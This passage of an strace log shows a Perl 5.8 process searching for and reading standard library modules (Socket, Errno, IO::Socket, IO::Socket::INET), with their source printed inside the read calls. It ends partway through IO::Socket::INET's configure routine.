7695  07:19:58.102463 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.102477 stat64("/usr/lib/perl5/Socket.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.102489 stat64("/usr/lib/perl5/Socket.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.102502 stat64("/usr/share/perl5/Socket.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.102514 stat64("/usr/share/perl5/Socket.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.102527 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.102540 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
7695  07:19:58.102561 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
7695  07:19:58.102575 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0568) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.102586 _llseek(8, 0, [0], SEEK_CUR) = 0
7695  07:19:58.102604 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
7695  07:19:58.103002 brk(0x8239000)    = 0x8239000
7695  07:19:58.103206 read(8, "", 4096) = 0
7695  07:19:58.103221 close(8)          = 0
7695  07:19:58.103308 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
7695  07:19:58.103341 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
7695  07:19:58.103370 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
7695  07:19:58.103385 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
7695  07:19:58.103476 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
7695  07:19:58.103494 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7da2000
7695  07:19:58.103508 mmap2(0xb7da7000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7da7000
7695  07:19:58.103524 close(8)          = 0
7695  07:19:58.104117 brk(0x825a000)    = 0x825a000
7695  07:19:58.104278 stat64("/etc/perl/Errno.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.104295 stat64("/etc/perl/Errno.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.104313 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.104334 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.104351 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.104364 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.104378 stat64("/usr/lib/perl5/Errno.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.104390 stat64("/usr/lib/perl5/Errno.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.104403 stat64("/usr/share/perl5/Errno.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.104415 stat64("/usr/share/perl5/Errno.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.104428 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.104441 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
7695  07:19:58.104462 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
7695  07:19:58.104477 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0568) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.104488 _llseek(8, 0, [0], SEEK_CUR) = 0
7695  07:19:58.104509 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
7695  07:19:58.105231 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
7695  07:19:58.105645 _llseek(8, 5966, [5966], SEEK_SET) = 0
7695  07:19:58.129805 _llseek(8, 0, [5966], SEEK_CUR) = 0
7695  07:19:58.129951 close(8)          = 0
7695  07:19:58.130393 brk(0x827b000)    = 0x827b000
7695  07:19:58.130563 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
7695  07:19:58.131028 _llseek(6, 6698, [6698], SEEK_SET) = 0
7695  07:19:58.131045 _llseek(6, 0, [6698], SEEK_CUR) = 0
7695  07:19:58.131056 close(6)          = 0
7695  07:19:58.131075 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.131091 stat64("/etc/perl/IO/Socket/INET.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.131105 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.131118 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.131133 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.131146 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.131160 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.131173 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.131187 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.131199 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.131213 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.131233 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
7695  07:19:58.131255 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
7695  07:19:58.131271 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0a18) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.131283 _llseek(6, 0, [0], SEEK_CUR) = 0
7695  07:19:58.131300 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = 